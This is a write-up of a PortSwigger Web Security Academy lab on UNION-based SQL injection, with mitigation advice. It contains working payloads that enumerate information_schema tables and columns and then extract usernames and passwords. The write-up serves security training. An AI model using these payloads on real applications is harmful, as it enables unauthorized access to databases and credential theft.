# SQL Injection Attack: Listing the Database Contents on Non-Oracle Databases

| Property       | Value                            |
| -------------- | -------------------------------- |
| **Category**   | SQL Injection                    |
| **Difficulty** | Practitioner                     |
| **Platform**   | PortSwigger Web Security Academy |
| **Status**     | ✅ Completed                      |

---

## Skills Demonstrated

* SQL Injection
* Database Enumeration
* Information Schema
* UNION-based SQL Injection
* Burp Suite
* Data Extraction

---

# Overview

This lab demonstrates how SQL Injection can be used to enumerate the structure of a database on **non-Oracle databases** such as MySQL and PostgreSQL.

Instead of immediately extracting sensitive information, attackers first discover which tables exist, identify the columns within those tables, and finally retrieve the desired data. This systematic approach is known as **database enumeration**.

---

# Lab Objective

Exploit a SQL Injection vulnerability to enumerate the database structure and retrieve the administrator's credentials.

---

# Understanding the Vulnerability

Every relational database stores metadata describing its own structure.

In MySQL and PostgreSQL, this metadata is exposed through the **Information Schema**, which contains details such as:

* Available databases
* Table names
* Column names
* Data types

If an application is vulnerable to SQL Injection, an attacker can query this metadata just like any other table.

---

# Attack Methodology

1. Confirm that UNION-based SQL Injection is possible.
2. Enumerate database tables.
3. Identify the table containing user information.
4. Enumerate the columns inside that table.
5. Retrieve usernames and passwords.

---

# Solution Walkthrough

The attack followed three main stages.

### Step 1 — Enumerate Tables

The following payload queried the Information Schema to list available tables.

```http
GET /filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

After identifying the users table, the next step was to inspect its columns.

---

### Step 2 — Enumerate Columns

The Information Schema was queried again to discover the available columns.

```http
GET /filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='<USERS_TABLE>'--
```

This revealed the username and password columns.

---

### Step 3 — Extract Credentials

Finally, the discovered columns were queried.

```http
GET /filter?category=Pets'+UNION+SELECT+<USERNAME_COLUMN>,<PASSWORD_COLUMN>+FROM+<USERS_TABLE>--
```

The application returned the administrator's credentials, completing the lab. The payload sequence is adapted from the methodology used in the lab while replacing lab-specific table names and credentials with placeholders.

---

# Payload Analysis

### `information_schema.tables`

Contains metadata about every table in the database.

### `information_schema.columns`

Stores information about every column in every table.

### `table_name`

Returns the names of database tables.

### `column_name`

Returns the names of columns belonging to a specific table.

### `UNION SELECT`

Combines attacker-controlled output with the application's original SQL query.

---

# Why the Attack Works

The application directly incorporated user input into its SQL query.

Because UNION-based SQL Injection was possible, system metadata tables could be queried to discover the database structure before extracting sensitive information.

---

# Detection Tips

Security testers can identify this vulnerability by:

* Testing whether UNION queries are accepted.
* Enumerating Information Schema tables.
* Looking for user-related tables.
* Inspecting column names before attempting data extraction.

---

# Common Mistakes

* Trying to extract credentials before identifying the correct table.
* Assuming every application uses a table named `users`.
* Forgetting to enumerate columns before querying data.
* Using Oracle system tables instead of Information Schema on MySQL/PostgreSQL.

---

# Real-World Scenario

During a penetration test, an attacker rarely knows the database structure in advance.

Instead, they systematically enumerate tables and columns until they identify where sensitive information such as user accounts, API keys, or customer records is stored.

This same methodology is widely used during authorized security assessments.

---

# Mitigation

Developers should:

* Use parameterized queries.
* Prevent dynamic SQL query construction.
* Restrict database permissions.
* Avoid exposing unnecessary metadata.
* Regularly perform SQL Injection testing.

---

# Key Takeaways

* Database enumeration is a structured process.
* Information Schema provides valuable metadata about the database.
* Table and column discovery usually precede data extraction.
* SQL Injection can expose an application's internal database design.

---

# References

* PortSwigger Web Security Academy
* OWASP SQL Injection Prevention Cheat Sheet
* MySQL Information Schema Documentation
* PostgreSQL Information Schema Documentation

---

> **Disclaimer:** This write-up documents a PortSwigger Web Security Academy lab completed in an authorized training environment for educational purposes only.
